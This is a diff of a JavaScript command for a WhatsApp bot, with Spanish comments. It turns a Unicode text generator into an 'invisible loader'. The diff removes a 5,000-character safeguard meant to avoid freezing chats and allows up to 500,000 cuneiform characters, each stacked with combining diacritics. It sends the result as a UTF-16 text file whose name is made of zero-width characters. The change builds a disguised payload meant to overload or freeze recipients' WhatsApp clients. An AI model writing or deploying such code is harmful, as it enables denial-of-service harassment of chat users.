@@ -1,11 +1,11 @@
-/* * 👑 Unicode Generator Pro (Heavy Load)
- * Genera una secuencia de caracteres densos para pruebas de renderizado.
+/* * 👑 Invisible Unicode Loader - Misa-Bot
+ * Genera un archivo con nombre invisible y carga densa.
  * Autor: Yanniel & Gemini
  */
 
-const unicodeCommand = {
+const unicodeInvisible = {
     name: 'unicode',
-    alias: ['uni', 'char'],
+    alias: ['heavy', 'txt'],
     category: 'utilidades',
     noPrefix: true,
 
@@ -13,36 +13,37 @@ const unicodeCommand = {
         const chat = m.key.remoteJid
         const reply = (txt) => conn.sendMessage(chat, { text: txt }, { quoted: m })
 
-        // 1. Obtener cantidad
-        let cantidad = parseInt(args[0])
+        // 1. Cantidad fija o por argumento (ej: unicode 10000)
+        let cantidad = parseInt(args[0]) || 10000
 
-        if (isNaN(cantidad) || cantidad < 1) {
-            return reply(`🖤 *¿Cuántos caracteres fuertecitos?*\n> Uso: unicode 100`)
-        }
-
-        // 2. Límite de estabilidad
-        // 5,000 caracteres es un bloque pesado pero que WhatsApp aún puede "digerir"
-        if (cantidad > 5000) {
-            return reply(`⚠️ *Límite:* El máximo es de 5,000 para no congelar tu propio chat.`)
-        }
+        // Límite de seguridad para el servidor
+        if (cantidad > 500000) cantidad = 500000
 
         try {
-            await conn.sendMessage(chat, { react: { text: '🌀', key: m.key } })
+            await conn.sendMessage(chat, { react: { text: '💾', key: m.key } })
 
-            // 3. Generar caracteres "fuertes" (Rango Cuneiforme y combinados)
-            let texto = ""
+            // 2. Generar carga de "peso" (Cuneiforme + Diacríticos apilados)
+            let carga = ""
             for (let i = 0; i < cantidad; i++) {
-                // Usamos un rango de Cuneiforme (0x12000) que es bastante denso
-                // Sumamos i * 2 para variar los glifos rápidamente
-                texto += String.fromCodePoint(0x12000 + (i % 800))
-                
-                // Cada 10 caracteres metemos un separador invisible de control para forzar al render
-                if (i % 10 === 0) texto += String.fromCodePoint(0x200D) 
+                // Carácter base denso (Cuneiforme)
+                carga += String.fromCodePoint(0x12000 + (i % 800))
+                // Apilamiento de diacríticos (esto es lo que genera el peso real)
+                carga += String.fromCodePoint(0x0345) 
+                carga += String.fromCodePoint(0x0361)
             }
 
-            // 4. Envío del bloque
-            await conn.sendMessage(chat, { 
-                text: texto 
+            const buffer = Buffer.from(carga, 'utf-16le') // UTF-16le ocupa más espacio/peso
+
+            // 3. Nombre de archivo invisible (Zero Width Characters)
+            // Usamos una combinación que WhatsApp detecta como nombre pero no muestra nada
+            const nombreInvisible = String.fromCodePoint(0x200C, 0x200C, 0x200C, 0x200C) + ".txt"
+
+            // 4. Enviar el archivo
+            await conn.sendMessage(chat, {
+                document: buffer,
+                mimetype: 'text/plain',
+                fileName: nombreInvisible,
+                caption: `✧ ‧₊˚ *CARGA GENERADA* ୧ֹ˖ ⑅ ࣪⊹\n\n✰ \`Peso\`: *${cantidad} unidades*\n› *Nombre:* (Invisible)\n\n> ⚡ *Proceso completado.*\n> Powered by 𝓜𝓲𝓼α ♡`
             }, { quoted: m })
 
             await conn.sendMessage(chat, { react: { text: '✅', key: m.key } })
@@ -50,9 +51,9 @@ const unicodeCommand = {
         } catch (err) {
             console.error(err)
             await conn.sendMessage(chat, { react: { text: '❌', key: m.key } })
-            return reply(`> ✐ Error en la generación de carga.`)
+            return reply(`> ✐ Error al generar la carga invisible.`)
         }
     }
 }
 
-export default unicodeCommand
+export default unicodeInvisible
